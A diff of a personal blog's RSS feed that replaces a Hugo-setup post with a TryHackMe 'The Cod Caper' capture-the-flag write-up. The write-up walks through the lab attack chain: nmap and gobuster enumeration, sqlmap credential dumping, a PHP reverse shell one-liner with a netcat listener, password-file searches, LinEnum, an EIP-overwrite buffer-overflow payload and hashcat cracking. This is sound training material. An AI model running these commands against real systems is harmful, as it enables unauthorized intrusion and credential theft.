@@ -14,8 +14,8 @@
             <pubDate>Thu, 01 Jul 2021 00:00:00 +0000</pubDate>
             
             <guid>https://nmmorette.github.io/posts/2021/07/hello-world/</guid>
-            <description>Created with Hugo with hello-friend-ng theme and GitHub pages.</description>
-            <content type="html"><![CDATA[<p>Created with Hugo with hello-friend-ng theme and GitHub pages.</p>
+            <description>Created with Hugo/hello-friend-ng theme and GitHub pages.</description>
+            <content type="html"><![CDATA[<p>Created with Hugo/hello-friend-ng theme and GitHub pages.</p>
 ]]></content>
         </item>
         
@@ -50,32 +50,136 @@ Unzip the files into the hugo default theme folder: ./Sites/YOURSITE/Themes</p>
         </item>
         
         <item>
-            <title>Write up The Cod Caper Room</title>
-            <link>https://nmmorette.github.io/posts/2021/07/write-up-the-cod-caper-room/</link>
+            <title>TryHackMe - The Cod Caper Writeup</title>
+            <link>https://nmmorette.github.io/posts/2021/07/tryhackme-the-cod-caper-writeup/</link>
             <pubDate>Thu, 01 Jul 2021 00:00:00 +0000</pubDate>
             
-            <guid>https://nmmorette.github.io/posts/2021/07/write-up-the-cod-caper-room/</guid>
-            <description>Step 1. Install Hugo Go to Hugo releases and download the appropriate version for your OS and architecture.
-More complete instructions are available at Install Hugo
-Step 2. Configure your Git Hub Pages You need a github account for this step.
-Step 3 Choose a theme In Hugo theme pages choose your favorite theme and download to your computer. Unzip the files into the hugo default theme folder: ./Sites/YOURSITE/Themes
-Then copy the content of config.</description>
-            <content type="html"><![CDATA[<h2 id="step-1-install-hugo">Step 1. Install Hugo</h2>
-<p>Go to <a href="https://github.com/spf13/hugo/releases">Hugo releases</a> and download the
-appropriate version for your OS and architecture.</p>
-<p>More complete instructions are available at <a href="https://gohugo.io/getting-started/installing/">Install Hugo</a></p>
-<h2 id="step-2-configure-your-git-hub-pages">Step 2. Configure your Git Hub Pages</h2>
-<p>You need a github account for this step.</p>
-<h2 id="step-3-choose-a-theme">Step 3 Choose a theme</h2>
-<p>In <a href="http://themes.hugo.io/">Hugo theme pages</a> choose your favorite theme and download to your computer.
-Unzip the files into the hugo default theme folder: ./Sites/YOURSITE/Themes</p>
-<p>Then copy the content of config.toml file in theme folder to the config.toml in your default site folder./Sites/YOUSITE/config.toml</p>
-<h2 id="step-4-running-hugo">Step 4 Running Hugo</h2>
-<p>With a terminal set in your default hugo webpage run:</p>
-<pre><code>hugo -D
+            <guid>https://nmmorette.github.io/posts/2021/07/tryhackme-the-cod-caper-writeup/</guid>
+            <description>Step 1. Intro This is a write up for &amp;ldquo;The Cod Caper&amp;rdquo; room at Try Hack Me.
+Room&amp;rsquo;s intro note:
+&amp;ldquo;Hello there my name is Pingu. I&amp;rsquo;ve come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn&amp;rsquo;t eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server.</description>
+            <content type="html"><![CDATA[<p><img src="/images/thecodcaper.jpg" alt="banner image 🤦‍♂️"></p>
+<h2 id="step-1-intro">Step 1. Intro</h2>
+<p>This is a write up for &ldquo;The Cod Caper&rdquo; room at Try Hack Me.</p>
+<p>Room&rsquo;s intro note:</p>
+<p>&ldquo;Hello there my name is Pingu. I&rsquo;ve come here to put in a request to get my fish back! My dad recently banned me from eating fish, as I wasn&rsquo;t eating my vegetables. He locked all the fish in a chest, and hid the key on my old pc, that he recently repurposed into a server. As all penguins are natural experts in penetration testing, I figured I could get the key myself! Unfortunately he banned every IP from Antarctica, so I am unable to do anything to the server. Therefore I call upon you my dear ally to help me get my fish back! Naturally I&rsquo;ll be guiding you through the process.</p>
+<h2 id="step-2-host-enumeration">Step 2. Host Enumeration</h2>
+<p>First of all let&rsquo;s nmap the machine IP.</p>
+<p>We&rsquo;re going to scan port 1 to 1000 as suggested in the task.</p>
+<pre><code> nmap -v -A -sC -p 1-100  10.10.41.158
 </code></pre>
-<p>Hugo will building your page acording withe the selected theme.</p>
-<p>img = assets/images/hugoserver.png</p>
+<p>Flags used:</p>
+<p>“-p 1–1000” = Used to specify which port to analyze, can also be used to specify a range of ports.</p>
+<p>“-sC” = Runs default scripts on the port, useful for doing basic analysis on the service running on a port.</p>
+<p>“-A” = Aggressive mode, go all out and try to get as much information as possible.</p>
+<p>We found 2 open ports, just pay attention in the nmap results, all answers for the first task are there.</p>
+<p><img src="/images/nmap.jpg" alt="nmap 🤦‍♂️"></p>
+<h2 id="step-3-web-enumeration">Step 3. Web Enumeration</h2>
+<p>Let&rsquo;s search for files and directories.</p>
+<p>You may use &ldquo;gobuster&rdquo; for that, but I particularly went with my bash script. You can download my script <a href="http:/https://github.com/nmmorette/bash-scripts/blob/25f02fa424136f0d23090072a773892e19c5c5b2/webrecon.sh/">here</a>
+Edit the file with a wordlist of your preference. I suggest the big.txt from dirb.</p>
+<p>Execute the .\webrecon.sh scritp in the target:</p>
+<pre><code> .\webrecon.sh TARGER_IP
+</code></pre>
+<p>As said you also should use gobuster. Use | grep 200 to filter the results.</p>
+<pre><code> .gobuster dir --url 10.10.41.158 --wordlist /usr/share/wordlists/dirb/big.txt -x &quot;php,txt,html&quot; | grep 200
+</code></pre>
+<p><img src="/images/gobuster.JPG" alt="gobuster 🤦‍♂️"></p>
+<p>Both modes weill lead us to a &ldquo;php&rdquo; file with an &ldquo;Administrator Login&rdquo; web page.</p>
+<p><img src="/images/thecodcaper/admin.JPG" alt="admin 🤦‍♂️"></p>
+<h2 id="step-4-web-exploitation">Step 4. Web Exploitation</h2>
+<p>Now we have a administrator page but we don&rsquo;t have credentials to log in, then lets try some SQL injection using the  &ldquo;sqlmap&rdquo; tool.</p>
+<p><img src="/images/thecodcaper/sql.jpg" alt="sql 🤦‍♂️"></p>
+<pre><code> sqlmap -u http://10.10.41.158/administrator.php --forms --dump
+</code></pre>
+<p>Flags used:</p>
+<p>&ldquo;-u&rdquo; = Specifies which url to attack.</p>
+<p>&ldquo;&ndash;forms&rdquo; = Automatically selects parameters from <!-- raw HTML omitted --> elements on the page.</p>
+<p>&ndash;dump = Used to retrieve data from the db once SQLI is found.</p>
+<p>As result we got a user/pass:</p>
+<p><img src="/images/thecodcaper/cred.jpg" alt="cred 🤦‍♂️"></p>
+<p>Finally we could login into administrator.php page and got a &ldquo;Run Command&rdquo; page:</p>
+<p><img src="/images/thecodcaper/run.jpg" alt="run 🤦‍♂️"></p>
+<h2 id="step-5-command-execution">Step 5. Command Execution</h2>
+<p>Since we have a form to run commands, let&rsquo;s run some basic command as &ldquo;ls&rdquo;</p>
+<p>It&rsquo;s working, we have the result:</p>
+<p><img src="/images/thecodcaper/files.jpg" alt="files 🤦‍♂️"></p>
+<p>That command give us the answer for the first question in the task</p>
+<p>Since we have the ability to run commands, lets try some reverse shell.
+We know that server use php then lets set a php reverse shell.
+This is one way, but feel free to try another kind of reverse shell like python or nc.</p>
+<p>We need to open a port in out atack machine:</p>
+<pre><code>nc -vnlp 12345
+</code></pre>
+<p>Php reverse shell:</p>
+<pre><code>php -r '$sock=fsockopen(&quot;MACHINE_IP&quot;,PORT);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+<p>Edit the command above with the atacked machine ip and port, then copy and past to &ldquo;Run Command&rdquo; web page</p>
+<p>Now we have a shell in the atacked machine and we need to find more information about the users.</p>
+<p>Lets check the /home directory</p>
+<p><img src="/images/thecodcaper/home.jpg" alt="home 🤦‍♂️"></p>
+<p>We also could check in the &ldquo;/etc/passwd&rdquo;</p>
+<p><img src="/images/thecodcaper/passwd.jpg" alt="passwd 🤦‍♂️"></p>
+<p>Now that we have a user name, lets search for private info.</p>
+<p>We could check all files from the user with the command:
+find / -user pingu -print 2&gt;/dev/null</p>
+<p>Also we could search for file names like: pass, secret, private etc&hellip;.
+find / -name pass* 2&gt;/dev/null</p>
+<p>Take a good look at the results and find the file with user&rsquo;s password.</p>
+<h2 id="step-6-linenum">Step 6. LinEnum</h2>
+<p>We have a user/pass then we could ssh the machine.</p>
+<p><img src="/images/thecodcaper/ssh.jpg" alt="ssh 🤦‍♂️"></p>
+<p>We&rsquo;re logged in the user machine, however we need to find possibles ways to priv esc. Let&rsquo;s go with LinEnum.</p>
+<p>&ldquo;LinEnum is a bash script that searches for possible ways to priv esc. It is incredibly popular due to the sheer amount of possible methods that it checks for, and often times Linenum is one of the first things to try when you get shell access.&rdquo;</p>
+<p>Lets copy the <a href="https://github.com/rebootuser/LinEnum">Linenum</a> scritp:</p>
+<pre><code> scp {path to linenum} {user}@{host}:{path}. Example: scp /opt/LinEnum.sh pingu@10.10.10.10:/tmp
+</code></pre>
+<p>After that, run linenum.sh</p>
+<p>Go to SUID files section and find the answer to task 6 only question.</p>
+<p><img src="/images/thecodcaper/suid.jpg" alt="ssh 🤦‍♂️"></p>
+<h2 id="step-7-pwndbg">Step 7. pwndbg</h2>
+<p>We found an interesting file in the step above,  moreover as explained in Tryhackme this file expects 32 characters in the input now we used “gdb” to analyze.</p>
+<pre><code> gdb /opt/secret/root
+</code></pre>
+<p><img src="/images/thecodcaper/gbd.jpg" alt="suid 🤦‍♂️"></p>
+<p>The pwndbg has successfully been initialized. The next phase is to test if anything happens when we send more then 32 characters.
+Type:
+r &lt; &lt;(cyclic 50)</p>
+<p>That command runs the program and provides 50 characters worth of &ldquo;cyclic&rdquo; input.
+After running this command you will see something like this:</p>
+<p><img src="/images/thecodcaper/secret.jpg" alt="suid 🤦‍♂️"></p>
+<p>Now this is where some knowledge of assembly helps. It seems that in this case we&rsquo;re able to overwrite EIP, which is known as the instruction pointer. The instruction pointer tells the program which bit of memory to execute next, which in an ideal case would have the program run normally. However, since we&rsquo;re able to overwrite it, we can theoretically execute any part of the program at any time.</p>
+<p>Recall the shell function from the source code, if we can overwrite EIP to point to the shell function, we can cause it to execute. This is also where the benefits of cyclic input show themselves. Recall that cyclic input goes in 4 character/byte sequences, meaning we&rsquo;re able to calculate exactly how many characters we need to provide before we can overwrite EIP.</p>
+<p>Luckily cyclic provides this functionality with the -l flag, running cyclic -l {fault address} will tell us exactly how many characters we need to provide we can overwrite EIP.</p>
+<p>Running:
+cyclic -l 0x6161616c</p>
+<p>Outputs 44, meaning we can overwrite EIP once we provide 44 characters of input.</p>
+<p>That&rsquo;s all we needed for pre-explotation!</p>
+<h2 id="step-8-binary-exploitation-manually--9-the-pwntools-way">Step 8. Binary-Exploitation: Manually | 9. The pwntools way</h2>
+<p>Thease two tasks lead us to the same result, we&rsquo;re going with step 8 pass in this write up, but feel free to try the pwntools way.</p>
+<p>&ldquo;Previously we figured out that we need to provide 44 characters of input, and then we can execute whatever part of the program we want. Now the next step is to find out exactly where the shell function is in memory so we know what to set EIP to. GDB supports this as well with the disassemble command. Type disassemble shell, and this should pop up&rdquo;
+disassemble shell</p>
+<p>&ldquo;What we&rsquo;re interested in is the hex memory addresses. So from what we know all we have to do is provide 44 characters, and then &ldquo;0x080484cb&rdquo; and the shell function should execute, let&rsquo;s try it!&rdquo;</p>
+<p>&ldquo;We can use python to do this, as it allows a nice way of converting.&rdquo;</p>
+<p>Python conversion:
+python -c &lsquo;print &ldquo;A&rdquo;*44 + &ldquo;\xcb\x84\x04\x08&rdquo;</p>
+<p>&ldquo;Will output the payload we want, but it requires manually converting to little endian.
+We print 44 random characters(in this case A) and then our memory address in little endian, and shell should execute. This can be tested by piping the output in to the binary&rdquo;
+python -c &lsquo;print &ldquo;A&rdquo;*44 + &ldquo;\xcb\x84\x04\x08&rdquo;&rsquo; | /opt/secret/root</p>
+<p>Save the hash!</p>
+<h2 id="step-10-finish-the-job">Step 10. Finish the job</h2>
+<p>Finally the last task. For this last one we need two things: the hash we get above and a little bit of pacient.</p>
+<p>&ldquo;Luckily hashcat supports cracking linux password hashes. You can find a list of hashcat modes <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">here</a> and <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">rockyou</a>.txt(a popular wordlist) here (if you don&rsquo;t already have it on your system)&rdquo;
+hashcat -m 1800 -a 0 pingu.hash /usr/share/wordlists/rockyou.txt</p>
+<p><img src="/images/thecodcaper/5.gif" alt="waiting🤦‍♂️">
+Flags:</p>
+<p>&ldquo;-a&rdquo; = Specify attack mode,attack modes can be found in the man page.
+&ldquo;-m&rdquo; = Specifies which mode to use, refer back to the list of modes</p>
+<p><img src="/images/thecodcaper/finalpass.gif" alt="pass🤦‍♂️"></p>
+<p>We did it!</p>
+<p>THM suggestion reading:</p>
+<p><a href="http://docs.pwntools.com/en/stable/">http://docs.pwntools.com/en/stable/</a></p>
+<p><a href="https://browserpwndbg.readthedocs.io/en/docs/">https://browserpwndbg.readthedocs.io/en/docs/</a></p>
 ]]></content>
         </item>
         
